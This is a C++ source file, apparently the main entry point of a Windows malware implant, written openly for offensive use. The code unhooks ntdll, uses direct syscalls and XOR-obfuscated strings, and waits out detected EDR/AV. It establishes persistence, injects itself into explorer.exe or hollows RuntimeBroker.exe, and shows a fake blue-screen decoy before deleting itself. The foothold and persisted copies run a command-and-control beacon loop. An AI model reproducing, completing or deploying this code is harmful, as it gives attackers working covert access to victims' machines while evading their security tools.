#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>
#include <thread>

namespace {
    // XOR Encrypted Strings (Key 0x5A)
    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
    const wchar_t kSvchostEnc[] = { 's'^0x5A, 'v'^0x5A, 'c'^0x5A, 'h'^0x5A, 'o'^0x5A, 's'^0x5A, 't'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // svchost.exe
    const wchar_t kVolatileEnvEnc[] = { 'V'^0x5A, 'o'^0x5A, 'l'^0x5A, 'a'^0x5A, 't'^0x5A, 'i'^0x5A, 'l'^0x5A, 'e'^0x5A, ' '^0x5A, 'E'^0x5A, 'n'^0x5A, 'v'^0x5A, 'i'^0x5A, 'r'^0x5A, 'o'^0x5A, 'n'^0x5A, 'm'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A }; // Volatile Environment
    const wchar_t kDropperPathEnc[] = { 'D'^0x5A, 'r'^0x5A, 'o'^0x5A, 'p'^0x5A, 'p'^0x5A, 'e'^0x5A, 'r'^0x5A, 'P'^0x5A, 'a'^0x5A, 't'^0x5A, 'h'^0x5A }; // DropperPath
    const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x5A, 'u'^0x5A, 'n'^0x5A, 't'^0x5A, 'i'^0x5A, 'm'^0x5A, 'e'^0x5A, 'B'^0x5A, 'r'^0x5A, 'o'^0x5A, 'k'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // RuntimeBroker.exe

    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess(const std::wstring& sPath) {
        std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
        std::wstring svchost = utils::DecryptW(kSvchostEnc, 11);
        std::wstring runtimeBroker = utils::DecryptW(kRuntimeBrokerEnc, 17);

        std::wstring lowerPath = sPath;
        for (auto& c : lowerPath) c = (wchar_t)::towlower(c);

        if (lowerPath.find(explorer) != std::wstring::npos) return true;
        if (lowerPath.find(svchost) != std::wstring::npos) return true;
        if (lowerPath.find(runtimeBroker) != std::wstring::npos) return true;
        return false;
    }

    bool IsRunningFromPersistLocation(const std::wstring& sPath) {
        std::wstring lowerPath = sPath;
        for (auto& c : lowerPath) c = (wchar_t)::towlower(c);

        if (lowerPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
            lowerPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
            if (lowerPath.find(L"\\temp\\") == std::wstring::npos && lowerPath.find(L"\\tmp\\") == std::wstring::npos) {
                return true;
            }
        }
        return false;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    wchar_t currentPathBuf[MAX_PATH];
    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
    std::wstring currentPath(currentPathBuf);

    LOG_INFO("--- WINMAIN ---");
    LOG_INFO("Process Path: " + utils::ws2s(currentPath));

    // Priority 1: Check if we are a Foothold (injected/hollowed)
    if (IsSystemProcess(currentPath)) {
        LOG_INFO("Detected Role: Foothold (Injected)");
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        (void)hr;

        // Try to establish persistence from IPC path if available
        wchar_t dropperPath[MAX_PATH] = {0};
        HKEY hKey;
        std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
        std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
        if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(dropperPath);
            if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                LOG_INFO("Foothold IPC: Source path found: " + utils::ws2s(dropperPath));
                persistence::establishPersistence(dropperPath);
            }
            RegCloseKey(hKey);
        } else {
            LOG_INFO("Foothold IPC: Source path not found. Checking existing persistence...");
            persistence::ReinstallPersistence();
        }

        LOG_INFO("Foothold: Starting beacon loop...");
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    // Priority 2: Check if we are running from a persisted location
    if (IsRunningFromPersistLocation(currentPath)) {
        LOG_INFO("Detected Role: Persisted");
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        (void)hr;

        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    // ROLE: Dropper
    LOG_INFO("Detected Role: Dropper");

    // Behavioral Evasion
    int jitter = evasion::Detection::GetJitterDelay();
    if (jitter > 0) {
        LOG_WARN("Evasion: EDR/AV detected. Jitter delay: " + std::to_string(jitter) + "s");
        Sleep(jitter * 1000);
    } else {
        Sleep(5000 + (GetTickCount() % 5000));
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    (void)hr;

    // 1. Establish Persistence immediately from dropper
    LOG_INFO("Dropper: Establishing initial persistence...");
    std::wstring persistedPath = persistence::establishPersistence();
    if (persistedPath.empty()) {
        LOG_ERR("Dropper: Persistence failed.");
    } else {
        LOG_INFO("Dropper: Persistence established at " + utils::ws2s(persistedPath));
    }

    // 2. Store self path for Foothold IPC
    HKEY hKeyIPC;
    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
    if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKeyIPC, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKeyIPC, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
        RegCloseKey(hKeyIPC);
    }

    // 3. Attempt Relocation (Injection/Hollowing)
    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        LOG_INFO("Dropper: Attempting in-memory relocation...");

        // Try explorer.exe first
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            LOG_INFO("Dropper: Injection successful. Relocating to Foothold.");
            decoy::ShowBSOD(); // Show decoy before cleaning up
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        }

        // Try RuntimeBroker.exe hollowing
        wchar_t systemPath[MAX_PATH];
        GetSystemDirectoryW(systemPath, MAX_PATH);
        std::wstring rb = utils::DecryptW(kRuntimeBrokerEnc, 17);
        std::wstring target = std::wstring(systemPath) + L"\\" + rb;

        if (evasion::Injector::HollowProcess(target, selfImage)) {
            LOG_INFO("Dropper: Hollowing successful. Relocating to Foothold.");
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        }
    }

    // 4. Fallback: If relocation failed, ensure the persisted copy is running
    LOG_WARN("Dropper: Relocation failed. Ensuring persisted copy is active.");
    if (!persistedPath.empty() && lstrcmpiW(currentPathBuf, persistedPath.c_str()) != 0) {
        STARTUPINFOW si; PROCESS_INFORMATION pi;
        RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        if (CreateProcessW(persistedPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            LOG_INFO("Dropper: Persisted copy launched.");
        }
    }

    decoy::ShowBSOD();
    CoUninitialize();
    utils::SelfDeleteAndExit();
    return 0;
}
